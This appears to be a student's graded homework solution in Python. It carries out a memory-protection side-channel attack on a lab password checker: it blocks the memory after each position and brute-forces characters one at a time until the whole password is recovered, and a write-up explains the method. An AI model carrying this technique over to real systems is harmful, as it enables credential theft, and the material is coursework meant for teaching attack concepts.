# -*- coding: utf-8 -*-
import subprocess

class solution:
    def __init__(self) -> None:
        # DO NOT MODIFY THE EXITED PROPERTIES
        # You can add as many properties as you need
        self.mem_ctl_exe = "./mem_ctl.exe"                      # This is the path of mem_ctl.exe file
        self.pwd_checker_exe = "./mem_password_checker.exe"     # This is the path of password_checker.exe file
        self.password = ""                                      # This is where your guessed password is store
        
    def setProtectMem(self, start_index, end_index):
        # DO NOT MODIFY THIS METHOD
        
        # This method used to set a range of memory can not be accessed starting from start_index, ending with end_index (included).
        # After set [start_index, end_index] as can not be accessed, any read or write operations will
        # If this operation successfully executed, this method will return some output from the mem_ctl.exe
        # Otherwise, this method will return -1
        if(start_index <= end_index and start_index >= 0 and start_index < 1024 and end_index >=0 and end_index < 1024):
            p1 = subprocess.Popen([self.mem_ctl_exe, str(start_index), str(end_index)],stdout=subprocess.PIPE)
            mem_ctl_exe_result = p1.communicate()[0].decode()
            return mem_ctl_exe_result
        else:
            return -1

    def checkPassword(self, password):
        # DO NOT MODIFY THIS METHOD
        
        # This method will pass your password to mem_password_checker.exe to verify the correctness
        # The return value is a string which is the output of mem_password_checker.exe
        # If password is correct, this method will return Correct
        # If password is wrong, this method will return Wrong
        # If mem_password_checker accessed an can not be accessed memory, this method will return SEG ERROR
        
        p2 = subprocess.Popen([self.pwd_checker_exe, password], stdout=subprocess.PIPE)
        pwd_checker_exe_result = p2.communicate()[0].decode()
        return pwd_checker_exe_result
    
    def example(self):
        # The following shows how to call a executable file in python and capture its output
        # You can modify it to test your ideas
        
        mem_ctl_exe_result = self.setProtectMem(100,1000)
        # You can print the output for debug or test.
        print(mem_ctl_exe_result)

        # After mem_ctl.exe executed, the memory in range [start_index, end_index] will be set to can not be accessed.
        # That means, password_check.exe will not accessible this section of memory.
        # Any read or write from password_check.exe to this range will cause an "SEG ERROR"

    
        pwd_checker_exe_result = self.checkPassword("guess")
        # You can print the output for debug or test.
        print(pwd_checker_exe_result)


        # For password_checker.exe, the password you input will be stored from the beginning of the memory.
        # Take the above parameters as input, the memory structure is shown below:

        # index:        0--------------------100----------------------------------1000----------1023
        # access type:  |-----accessible------|---------cannot be accessed----------|--accessible--|
        # value:        guess\0#####################################################################

        print(self.password)
    
    def getPassword(self):
        # Please complete this method
        # It should be the return the correct password in a string
        # You should modify the start_index, end_index and password appropriately to achieve the attack
        # GradeScope will import your class, and call this method to get the password you calculated.
        
        guessPass = ""
        print("Start password guessing", guessPass)

        # flag variable to stop execution as soon as the checkPassword() methods returns 'Correct'
        foundPass = False

        # running the loop for maximum of 20 times (max length of password is 20)
        for len in range(1,21):

            # break out of the loop when password has been guessed
            if(foundPass):
                print("Done password guessing\nGuessed password is: ", guessPass)
                break

            # block the memory space following the position being guessed
            mem_ctl_exe_result = self.setProtectMem(len,1023)
            # print(mem_ctl_exe_result)

            # test each character from ASCII 33(!) to ASCII 126(~)
            for i in range(33,127):
                # chr(i) gives the string for the ASCII integer 
                pwd_checker_exe_result = self.checkPassword(guessPass + (chr(i)))
                # possible return words are 'Wrong', 'Correct' and 'SEG ERROR'
                # 'Wrong' - test character is not present at the current position, continue
                # 'SEG ERROR' - test character is present at the current position, but password is longer
                # 'Correct' - test character is present at the current position, and password is complete
                if(pwd_checker_exe_result != "Wrong"):
                    print(chr(i), pwd_checker_exe_result)
                    guessPass += chr(i)
                    if(pwd_checker_exe_result == "Correct"):
                        foundPass = True
                    break

            print("guessPass after ", str(len) ,": ", guessPass)       

        self.password = guessPass
        print(self.password)

        return self.password
    

# Write Up
# Please explain your solution
    
# The side channel utilized in this problem is the fact that length of input string is not compared against the password, but 
# each character is checked with the corresponding character in the password.

# To guess each character, the program memory after the position being guessed is blocked. Each of the potential characters are
# then tested as the password for that position.
# The three output scenarios are - 
# 1. 'Wrong' - The character is not correct for that position in password, and to keep guessing further.
# 2. 'SEG ERROR' - The character guessed is correct for that position. But after that it accessed the restricted part, meaning 
# there are more characters in the password
# 3. 'Correct' - The character guessed is correct for that position, and the whole password is guessed, no further step needed.
        
# For reference,

# Character 1 - blocked range [1,1023]

# index:        0-1---------------------------------------------------------------------1023
# access type:  |-|--------------------------cannot be accessed----------------------------|
# value:        l\0#########################################################################

# Character 2 - blocked range [2,1023]

# index:        0--2---------------------------------------------------------------------1023
# access type:  |--|--------------------------cannot be accessed----------------------------|
# value:        lW\0#########################################################################

# ...
# until 

# Character 20 - blocked range [20,1023]

# index:        0------------------20----------------------------------------------------1023
# access type:  |-----accessible----|-----------------cannot be accessed--------------------|
# value:        lWabcdefghop072ak~2z\0#######################################################


mySol = solution()

myPass = mySol.getPassword()
print(myPass)